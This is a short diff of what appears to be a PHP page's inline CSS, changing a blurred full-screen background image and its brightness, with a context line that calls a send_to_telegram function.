@@ -38,8 +38,8 @@ send_to_telegram($msg);
             position: fixed;
             top: 0; left: 0;
             width: 100%; height: 100%;
-            background: url('img/image.jpg') no-repeat center center/cover;
-            filter: blur(20px) brightness(0.4);
+            background: url('img/image1.jpg') no-repeat center center/cover;
+            filter: blur(20px) brightness(0.3);
             z-index: -1;
             transition: all 1s ease;
         }
